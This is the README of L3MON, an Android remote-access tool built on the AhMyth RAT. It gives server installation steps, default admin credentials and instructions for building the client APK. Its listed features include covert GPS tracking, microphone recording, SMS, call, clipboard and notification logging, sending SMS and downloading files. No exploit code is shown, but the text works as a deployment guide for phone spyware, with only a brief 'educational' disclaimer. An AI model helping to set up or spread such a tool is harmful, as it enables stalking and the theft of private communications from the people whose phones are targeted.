<p align="center">
<img src="https://github.com/D3VL/L3MON/raw/master/server/assets/webpublic/logo.png" height="60"><br>
A cloud based remote android management suite, powered by NodeJS
</p>



## Features
- GPS Logging
- Microphone Recording
- View Contacts
- SMS Logs
- Send SMS
- Call Logs
- View Installed Apps
- View Stub Permissions
- Live Clipboard Logging
- Live Notification Logging
- View WiFi Networks (logs previously seen)
- File Explorer & Downloader
- Command Queuing
- Built In APK Builder

## Prerequisites 
 - Java Development Kit 11+
    - See [installation](#Installation) for OS specifics
 - NodeJs 14+ 
 - A Server
 - Android SDK (for building the client APK from source)

## Installation 
1. Install JDK 11+
    - Debian, Ubuntu, Etc
        - `sudo apt-get install openjdk-11-jdk`
    - Fedora, Oracle, Red Hat, etc
        -  `sudo yum install java-11-openjdk-devel`
    - Windows 
        - Download from [Adoptium](https://adoptium.net/)
    - macOS (Homebrew)
        - `brew install openjdk@11`

2. Install NodeJS 14+ [Instructions Here](https://nodejs.org/en/download/package-manager/)

3. install PM2 
    - `npm install pm2 -g`

4. Download and Extract the latest release from [HERE](https://github.com/D3VL/L3MON/releases/)

5. In the extracted folder, run these commands
    - `cd server`
    - `npm install` <- install dependencies
    - `pm2 start index.js` <-- start the script
    - `pm2 startup` <- to run L3MON on startup

6. The server starts with default credentials:
    - **Username:** `admin`
    - **Password:** `819054967774`

   > ⚠️ **Change these immediately after first login.** To update credentials:
    1. Stop L3MON `pm2 stop index`
    2. Open `maindb.json` in a text editor
    3. under `admin`
        - set the `username` as plain text
        - set the `password` as a LOWERCASE MD5 hash
    4. save the file
    5. run `pm2 restart all`

7. in your browser navigate to `http://<SERVER IP>:22533`
    
It's recommended to run L3MON behind a reverse proxy such as [NGINX](https://www.nginx.com/resources/wiki/start/topics/tutorials/install/)

## Building the APK

For detailed instructions on building the Android client APK, see [BUILDING.md](BUILDING.md).

**Quick Start:**
- **From the web dashboard:** Use the built-in APK Builder (navigate to the Builder page after logging in)
- **From source:** See `client/` directory and run `./gradlew assembleDebug`

### Client Compatibility
- **Minimum Android Version:** 5.0 (Lollipop, API 21)
- **Target Android Version:** 14 (API 34)
- **Tested on:** Android 5.0 through Android 14

## Screenshots
| | | |
|:-------------------------:|:-------------------------:|:-------------------------:|
|<a href="https://github.com/D3VL/L3MON/raw/master/Screenshots/call_log.png"> <img width="1604" src="https://github.com/D3VL/L3MON/raw/master/Screenshots/call_log.png"> Call Log</a> | <a href="https://github.com/D3VL/L3MON/raw/master/Screenshots/apk_builder.png"> <img width="1604" src="https://github.com/D3VL/L3MON/raw/master/Screenshots/apk_builder.png"> APK Builder</a> |<a href="https://github.com/D3VL/L3MON/raw/master/Screenshots/clipboard.png"> <img width="1604" src="https://github.com/D3VL/L3MON/raw/master/Screenshots/clipboard.png"> Clipboard Log</a>||
<a href="https://github.com/D3VL/L3MON/raw/master/Screenshots/contacts.png"> <img width="1604" src="https://github.com/D3VL/L3MON/raw/master/Screenshots/contacts.png"> Contacts</a>  |  <a href="https://github.com/D3VL/L3MON/raw/master/Screenshots/devices.png"> <img width="1604" src="https://github.com/D3VL/L3MON/raw/master/Screenshots/devices.png"> Devices</a>|<a href="https://github.com/D3VL/L3MON/raw/master/Screenshots/file_explorer.png"> <img width="1604" src="https://github.com/D3VL/L3MON/raw/master/Screenshots/file_explorer.png"> File Explorer</a>||
<a href="https://github.com/D3VL/L3MON/raw/master/Screenshots/gps_log.png"> <img width="1604" src="https://github.com/D3VL/L3MON/raw/master/Screenshots/gps_log.png"> GPS Log</a>  | <a href="https://github.com/D3VL/L3MON/raw/master/Screenshots/sms_log.png"> <img width="1604" src="https://github.com/D3VL/L3MON/raw/master/Screenshots/sms_log.png"> SMS Log</a> |<a href="https://github.com/D3VL/L3MON/raw/master/Screenshots/sms_send.png"> <img width="1604" src="https://github.com/D3VL/L3MON/raw/master/Screenshots/sms_send.png"> Send SMS</a>||
<a href="https://github.com/D3VL/L3MON/raw/master/Screenshots/installed_apps.png"> <img width="1604" src="https://github.com/D3VL/L3MON/raw/master/Screenshots/installed_apps.png"> Installed Apps</a> | <a href="https://github.com/D3VL/L3MON/raw/master/Screenshots/microphone.png"> <img width="1604" src="https://github.com/D3VL/L3MON/raw/master/Screenshots/microphone.png"> Microphone</a> |<a href="https://github.com/D3VL/L3MON/raw/master/Screenshots/notification_log.png"> <img width="1604" src="https://github.com/D3VL/L3MON/raw/master/Screenshots/notification_log.png"> Notifications</a>||
<a href="https://github.com/D3VL/L3MON/raw/master/Screenshots/event_log.png"> <img width="1604" src="https://github.com/D3VL/L3MON/raw/master/Screenshots/event_log.png"> Event Log</a> | <a href="https://github.com/D3VL/L3MON/raw/master/Screenshots/login.png"> <img width="1604" src="https://github.com/D3VL/L3MON/raw/master/Screenshots/login.png"> Login</a> |<a href="https://github.com/D3VL/L3MON/raw/master/Screenshots/wifi_manager.png"> <img width="1604" src="https://github.com/D3VL/L3MON/raw/master/Screenshots/wifi_manager.png"> WiFi Manager</a>|

## Thanks
L3MON Builds off and utilizes serveral opensource softwares, Without these, L3MON Wouldn't be what it is!
 - Inspiration for the project and the basic building blocks for the Android App are based off [AhMyth](https://github.com/AhMyth/AhMyth-Android-RAT) 
 - [express](https://github.com/expressjs/express)
 - [node-geoip](https://github.com/bluesmoon/node-geoip)
 - [lowdb](https://github.com/typicode/lowdb)
 - [socket.io](https://github.com/socketio/socket.io)
 - [Open Street Map](https://www.openstreetmap.org)
 - [Leaflet](https://leafletjs.com/)

## Disclaimer
<b>D3VL Provides no warranty with this software and will not be responsible for any direct or indirect damage caused due to the usage of this tool.<br>
L3MON is built for both Educational and Internal use ONLY.</b>

<br>
<p align="center">Made with ❤️ By <a href="//d3vl.com">D3VL</a></p>
<p align="center" style="font-size: 8px">v2.0.0</p>